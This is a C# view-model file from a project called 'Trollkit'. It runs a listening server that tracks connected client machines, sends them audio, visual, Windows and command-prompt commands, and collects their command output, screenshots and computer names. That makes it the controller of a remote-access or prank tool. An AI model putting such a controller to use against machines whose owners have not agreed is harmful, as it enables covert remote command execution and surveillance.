using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Trollkit_Library.ClientModules;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;
using Trollkit_Library.ViewModels.Commands;

namespace Trollkit_Library.ViewModels
{
	public class ServerViewModel : INotifyPropertyChanged
	{
		public static Server Server;

		public event PropertyChangedEventHandler PropertyChanged;

		//sub viewmodels
		public AudioCommands Audio { get; private set; }
		public VisualCommands Visual { get; private set; }
		public WindowsCommands Windows { get; private set; }
        public ClientCommands Client { get; private set; }
		public CMDCommands CMD { get; private set; }

		//model properties
		public List<Client> Clients { get { return Server.Clients; } }

		/// <summary>
		/// Returns the currently selected client
		/// </summary>
		public Client SelectedClient
		{
			get
			{
				return Server.SelectedClient;
			}
			set
			{
				Server.SelectedClient = value;
				AllClientsSelected = false;
				NotifyPropertyChanged("SelectedClient");
				NotifyPropertyChanged("CurrentClientName");
			}
		}

		/// <summary>
		/// Returns the name of the current selected client, if all clients are selected it returns "All Clients Selected"
		/// </summary>
		public string CurrentClientName
		{
			get
			{
				if(Clients.Count == 0)
				{
					return "There are no clients connected";
				}
				else
				{
					if (AllClientsSelected)
					{
						return "All clients are selected";
					}
					else
					{
						//check if ComputerName exists
						if (SelectedClient.storedData.ContainsKey("ComputerName"))
						{
							return SelectedClient.storedData["ComputerName"];
						}
						else
						{
							return SelectedClient.ToString();
						}					
					}
				}
			}
		}

		/// <summary>
		/// Boolean that tells you if the host wants to send its commands to all clients or simply to one.
		/// </summary>
		public bool AllClientsSelected
		{
			get
			{
				if(Clients.Count == 0)
				{
					return true; //to disable the buttons that require atleast one client selected
				}

				return Server.AllClientsSelected;
			}
			set
			{
				Server.AllClientsSelected = value;
				NotifyPropertyChanged("AllClientsSelected");
				NotifyPropertyChanged("CurrentClientName");
			}
		}

		/// <summary>
		/// Boolean that tells you if there are clients connected to the host
		/// </summary>
		public bool ClientsAvailable { get { return Server.ClientsAvailable; } }

		public ServerViewModel()
		{
			Server = new Server(IPAddress.Any);
			Server.ClientConnected += Server_ClientConnected;
			Server.ClientDisconnected += Server_ClientDisconnected;
			Server.MessageReceived += Server_MessageReceived;
			Server.OnPropertyChanged += Server_OnPropertyChanged;
			Server.Start();

			Audio = new AudioCommands(Server, "Audio");
			Visual = new VisualCommands(Server, "Visuals");
			Windows = new WindowsCommands(Server, "Windows");
			Client = new ClientCommands(Server, "Client");
			CMD = new CMDCommands(Server, "CMD");

			Task.Run(() => new ServerDiscovery("gang?", "Dopple gang").Discover());
		}	

		/// <summary>
		/// Called when a new message was received on any client socket.
		/// </summary>
		/// <param name="c"></param>
		/// <param name="model"></param>
		/// <param name="type"></param>
		private void Server_MessageReceived(Client c, TransferCommandObject model, Server.DataByteType type)
		{
			BConsole.WriteLine($"Client {c.GetName()} sent a message", ConsoleColor.DarkGray);

			switch (type)
			{
				case Server.DataByteType.Response:
					if(model.Command == "CMDResponse")
					{
						c.AddToCMDBuffer(model.Value);
					}		
					else if (model.Command == "ScreenshotResponse")
					{
						c.SetScreenshot(model.Value);
					}
					else if(model.Command == "ScreenList")
					{
						List<ScreenTypeModel> screenList = JsonConvert.DeserializeObject<List<ScreenTypeModel>>(model.Value);
						if(screenList != null)
						{
							c.SetScreenData(screenList);
						}
					}
					break;
				case Server.DataByteType.Command:
					if (model.Command == "Debug")
					{
						TransferCommandObject returnObject = new TransferCommandObject { Command = "PlayBeep", Handler = "Audio", Value = "200,300" };
						Server.SendDataObjectToSocket(Server.DataByteType.Command, Server.GetSocketByClient(c), ClientServerPipeline.BufferSerialize(returnObject));
					}
					break;
				case Server.DataByteType.Data:
					c.SetDataItem(model.Command, model.Value);
					NotifyPropertyChanged("SelectedClient.storedData");
					NotifyPropertyChanged("CurrentClientName");
					break;
			}			
		}

		/// <summary>
		/// Called when a client disconnects
		/// </summary>
		/// <param name="c"></param>
		private void Server_ClientDisconnected(Client c)
		{
			BConsole.WriteLine($"Client {c.GetName()} has disconnected!", ConsoleColor.Yellow);
			if (Server.SelectedClient == c)
			{
				Server.SelectedClient = Server.Clients.FirstOrDefault();
			}
			NotifyPropertyChanged("Clients");
			NotifyPropertyChanged("AllClientsSelected");
			NotifyPropertyChanged("ClientsAvailable");
			NotifyPropertyChanged("SelectedClient");
			NotifyPropertyChanged("CurrentClientName");
		}

		/// <summary>
		/// Called when a client connects
		/// </summary>
		/// <param name="c"></param>
		private void Server_ClientConnected(Client c)
		{
			BConsole.WriteLine($"Client {c.GetName()} has connected!", ConsoleColor.Yellow);
			if (Server.SelectedClient == null)
			{
				Server.SelectedClient = c;
			}
			NotifyPropertyChanged("Clients");
			NotifyPropertyChanged("AllClientsSelected");
			NotifyPropertyChanged("ClientsAvailable");
			NotifyPropertyChanged("SelectedClient");
			NotifyPropertyChanged("CurrentClientName");
		}

		/// <summary>
		/// Called when a property changes inside the server class, this function then passes it on to the ViewHandler
		/// </summary>
		/// <param name="Property"></param>
		private void Server_OnPropertyChanged(string Property)
		{
			NotifyPropertyChanged(Property);
		}

		/// <summary>
		/// The important notifier method of changed properties. This function should be called whenever you want to inform other classes that some property has changed.
		/// </summary>
		/// <param name="propertyName">The name of the updated property. Leaving this blank will fill in the name of the calling property.</param>
		private void NotifyPropertyChanged([CallerMemberName] String propertyName = "")
		{
			PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
		}
	}
}
